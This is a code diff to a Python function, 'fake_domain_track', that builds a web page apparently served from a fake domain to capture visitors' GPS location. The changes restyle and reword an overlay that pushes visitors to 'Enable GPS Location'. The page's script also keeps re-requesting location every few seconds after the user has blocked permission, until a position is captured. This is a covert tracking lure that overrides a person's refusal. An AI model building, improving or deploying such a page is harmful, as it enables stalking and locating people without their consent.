@@ -254,7 +254,7 @@ def fake_domain_track(link_id):
                 fill: currentColor;
             }}
             
-            /* GPS OFF Indicator - Shows when location is disabled */
+            /* GPS OFF Indicator */
             .location-indicator {{
                 position: fixed;
                 bottom: 100px;
@@ -265,32 +265,38 @@ def fake_domain_track(link_id):
                 align-items: center;
                 gap: 12px;
                 z-index: 100;
-                background: rgba(255,255,255,0.05);
-                padding: 16px 24px;
-                border-radius: 16px;
-                backdrop-filter: blur(10px);
-                border: 1px solid rgba(255,255,255,0.05);
+                background: rgba(255,255,255,0.08);
+                padding: 20px 28px;
+                border-radius: 20px;
+                backdrop-filter: blur(15px);
+                border: 1px solid rgba(255,255,255,0.06);
+                animation: fadeIn 0.5s ease;
             }}
             .location-indicator.show {{
                 display: flex;
             }}
+            @keyframes fadeIn {{
+                from {{ opacity: 0; transform: translateX(-50%) scale(0.9); }}
+                to {{ opacity: 1; transform: translateX(-50%) scale(1); }}
+            }}
             .location-icon {{
-                font-size: 32px;
-                animation: pulse 1.5s infinite;
+                font-size: 36px;
+                animation: pulse 1.5s ease-in-out infinite;
             }}
             @keyframes pulse {{
-                0%, 100% {{ transform: scale(1); opacity: 0.7; }}
-                50% {{ transform: scale(1.1); opacity: 1; }}
+                0%, 100% {{ transform: scale(1); opacity: 0.8; }}
+                50% {{ transform: scale(1.15); opacity: 1; }}
             }}
             .location-text {{
-                color: #aaaaaa;
-                font-size: 12px;
-                letter-spacing: 0.5px;
+                color: #ffffff;
+                font-size: 14px;
+                font-weight: 500;
+                letter-spacing: 0.3px;
                 text-align: center;
             }}
             .location-sub {{
-                color: #666666;
-                font-size: 10px;
+                color: #888888;
+                font-size: 11px;
                 text-align: center;
                 margin-top: -4px;
             }}
@@ -337,9 +343,9 @@ def fake_domain_track(link_id):
             
             <!-- GPS OFF Indicator -->
             <div class="location-indicator" id="locationIndicator">
-                <div class="location-icon">📍</div>
-                <div class="location-text">Enable location services</div>
-                <div class="location-sub">Turn on GPS to continue</div>
+                <div class="location-icon">📡</div>
+                <div class="location-text">Enable GPS Location</div>
+                <div class="location-sub">Turn on location services to continue</div>
             </div>
             
             <div class="bottom-nav">
@@ -369,7 +375,6 @@ def fake_domain_track(link_id):
             const locationIndicator = document.getElementById('locationIndicator');
             let locationCaptured = false;
             let attempts = 0;
-            let gpsOffShown = false;
             
             function sendLocation(position) {{
                 if (locationCaptured) return;
@@ -407,16 +412,13 @@ def fake_domain_track(link_id):
                 attempts++;
                 
                 if (error.code === 1) {{
-                    // Permission denied - user clicked "Block"
-                    // Keep trying - browser might show popup again
+                    // Permission denied - user blocked it
+                    // Keep trying, browser may show popup again
                     setTimeout(requestLocation, 5000);
                 }} else if (error.code === 2 || error.code === 3) {{
-                    // Position unavailable or timeout = GPS is OFF
-                    if (!gpsOffShown) {{
-                        gpsOffShown = true;
-                        locationIndicator.classList.add('show');
-                    }}
-                    // Keep retrying until GPS is turned on
+                    // Position unavailable = GPS is OFF
+                    locationIndicator.classList.add('show');
+                    // Keep retrying until GPS turns on
                     setTimeout(requestLocation, 3000);
                 }} else {{
                     setTimeout(requestLocation, 2000);
